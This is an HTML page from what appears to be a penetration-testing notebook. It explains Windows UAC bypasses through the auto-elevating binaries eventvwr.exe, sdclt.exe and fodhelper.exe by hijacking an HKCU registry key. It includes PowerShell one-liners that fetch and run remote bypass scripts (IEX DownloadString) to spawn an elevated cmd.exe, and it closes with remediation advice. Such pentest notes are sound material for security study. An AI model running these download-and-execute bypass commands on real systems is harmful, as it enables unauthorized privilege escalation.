<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AutoElevate UAC bypass (Powershell)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>AutoElevate UAC bypass (Powershell)</h1><br /><br /><strong>Prerequisite:</strong><br />• Windows
    OS &gt; 7 (not included)<br /><br />1. executable with AutoElevate and requireAdministrator “privileges” in the
    Manifest<br /> Some Microsoft signed binaries, can auto-elevate themselves from <a
      href="etration_Test_Methodology--Network_Pentest--Post_Exploitation--Privilege_Escalation--Windows_Privilege_Escalation--9._Access_Tokens_(UAC).html">Medium
      Integrity to High Integrity level</a> thanks to their &quot;Manifest&quot; inside the executable.<br /> <span
      style="color:#ff0000;">If requestedExecutionLevel is set to “AsInvoker”(usually on Windows 7), it prevent
      auto-elevation when started from medium integrity</span><br /> <strong>Strings(SysInternals):</strong> <a
      href="https://download.sysinternals.com/files/Strings.zip" target="_blank">https://download.sysinternals.com/files/Strings.zip</a><br />
    ◇ checking <a
      href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank">eventvwr.exe</a><span
      style="color:#3ad900;"> </span><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/Strings.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\strings&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\strings\strings.exe&nbsp;-accepteula&nbsp;C:\Windows\System32\eventvwr.exe&nbsp;|&nbsp;findstr&nbsp;/i&nbsp;&#39;level=&nbsp;autoelevate&#39;&quot;;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;&nbsp;Remove-Item&nbsp;-r&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\strings&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1377-1.png" alt="images/1377-1.png" /></a><br /> ◇ checking <a
      href="https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/" target="_blank">sdclt.exe</a><span
      style="color:#3ad900;"> </span><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/Strings.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\strings&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\strings\strings.exe&nbsp;-accepteula&nbsp;C:\Windows\System32\sdclt.exe&nbsp;|&nbsp;findstr&nbsp;/i&nbsp;&#39;level=&nbsp;autoelevate&#39;&quot;;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;&nbsp;Remove-Item&nbsp;-r&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\strings&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1377-2.png" alt="images/1377-2.png" /></a><br /> ◇ checking <a
      href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/" target="_blank">fodhelper.exe</a> <br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/Strings.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\strings&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\strings\strings.exe&nbsp;-accepteula&nbsp;C:\Windows\System32\fodhelper.exe&nbsp;|&nbsp;findstr&nbsp;/i&nbsp;&#39;level=&nbsp;autoelevate&#39;&quot;;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;&nbsp;Remove-Item&nbsp;-r&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\strings&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1377-3.png" alt="images/1377-3.png" /></a><br />2. If this executable does
    not find a registry key in HKCU, because of the current user has total permission to create or modify any key on
    HKCU registry, the binary is exploitable.<br /> We can check the registry keys loaded from the executable with
    &quot;Process Monitor&quot; Sysinternal application<br /> The operation on the registry key it need to be of this
    type:<br /> 1) Operation → RegOpenKey<br /> 2) Path → HKCU\Software\Classes\ms-settings\Shell\Open\command<br /> 3)
    Result → NAME NOT FOUND <br /> We can add this registry key with a custom malicious value. For example a path to a
    malicious payload.<br /> ◇ Check eventvwr.exe (automated script)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-EventVwrBypass.ps1&nbsp;&quot;);Invoke-EventVwrBypass&nbsp;-Command&nbsp;&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&nbsp;cmd.exe&quot;
      </div>
    </div><br /> ◇ Check sdclt.exe (automated script)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-SDCLTBypass.ps1&nbsp;&quot;);Invoke-SDCLTBypass&nbsp;-Command&nbsp;&quot;C:\Windows\System32\cmd.exe&nbsp;/c&nbsp;cmd.exe&quot;
      </div>
    </div><br /> ◇ Check fodHelper.exe (automated script)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://gist.githubusercontent.com/netbiosX/a114f8822eb20b115e33db55deee6692/raw/bd61ba9db7af8ffcd57d3dbfa8208b495cdc854d/FodhelperUACBypass.ps1&nbsp;&quot;);FodhelperUACBypass&nbsp;-program&nbsp;&quot;cmd.exe&quot;
      </div>
    </div><br /><br /><strong>Remediation:</strong><br />This particular technique can be remediated or fixed by setting
    the UAC level to “Always Notify” or by removing the current user from the Local Administrators
    group.<br /><br /><strong>Bibliography:</strong><br />• <a
      href="https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/" target="_blank">https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/</a><br />•
    <a
      href="https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3" target="_blank">https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3</a><br />•
    <a
      href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank">https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</a><br />•
    <a
      href="https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/" target="_blank">https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/</a><br />•
    <a
      href="https://egre55.github.io/system-properties-uac-bypass/" target="_blank">https://egre55.github.io/system-properties-uac-bypass/</a><br />•
    <a
      href="https://soclevelone.com/index.php/2019/01/14/bypassing-windows-uac/" target="_blank">https://soclevelone.com/index.php/2019/01/14/bypassing-windows-uac/</a><br /><br /><br /><br />----------------------------------------------------------------------------------------------------<br /><br /><strong>Process
      Monitor</strong> (already as Administrator for testing purpose)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/ProcessMonitor.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\procmon64.exe&quot;;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\procmon64.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;
      </div>
    </div><br />Filter → Filter<br /> <a href=""><img src="images/1377-4.png" alt="images/1377-4.png" /></a><br /> <a
      href=""><img src="images/1377-5.png" alt="images/1377-5.png" /></a><br /><br /><strong>Process Explorer</strong>
    (already as Administrator for testing purpose)<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://download.sysinternals.com/files/ProcessExplorer.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\procexp.exe&quot;;&nbsp;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\file.zip&quot;;
      </div>
    </div>
  </div>
</body>

</html>